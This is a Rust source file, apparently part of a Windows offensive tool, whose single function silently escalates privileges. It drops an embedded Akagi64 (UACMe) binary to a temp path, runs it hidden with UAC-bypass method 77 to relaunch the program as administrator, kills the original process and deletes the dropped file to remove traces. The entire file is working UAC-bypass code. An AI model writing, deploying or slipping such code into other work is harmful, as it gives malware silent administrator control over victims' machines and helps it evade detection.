use std::{os::windows::process::CommandExt, path::PathBuf, process::Command, time::Duration};

use rust_embed::RustEmbed;
use winapi::um::winbase::CREATE_NO_WINDOW;

use crate::debug;

#[derive(RustEmbed)]
#[folder = "assets/"]
struct Assets;

/**
 * If already elevated, continues as normal.
 * Otherwise it will use Akagi64 to spawn an escalated version of itself and kill the original process.
 */
pub fn ensure_elevated() {
    let akagi_path = PathBuf::from(r"C:\tmp\repulser.bin");
    let akagi_bytes = Assets::get("Akagi64.bin").unwrap().data;

    /* Ensure Elevation */

    if !is_elevated::is_elevated() {
        debug!("Running in non-elevated state. Attempting elevation with Akagi64.");

        /* Extract akagi to file to and execute with the current program as the argument */

        if let Some(parent) = akagi_path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }

        std::fs::write(&akagi_path, akagi_bytes).expect("Could not write akagi binary");

        debug!("Successfully extracted Akagi binary. Running self with Akagi64.");

        Command::new(&akagi_path)
            .args(["77", std::env::current_exe().unwrap().to_str().unwrap()])
            .creation_flags(CREATE_NO_WINDOW)
            .spawn()
            .expect("Failed to spawn Akagi64");

        debug!("Successfully ran Akagi64! Exiting original process.");

        std::process::exit(0)
    }

    debug!("Successfully ran as elevated local administrator. Cleaning up elevation garbage.");

    /* Elevation cleanup */

    while akagi_path.exists() {
        if let Err(e) = std::fs::remove_file(&akagi_path) {
            debug!("Failed to remove Akagi64.exe: {:?}", e);
            std::thread::sleep(Duration::from_millis(200));
            continue;
        };
    }
}
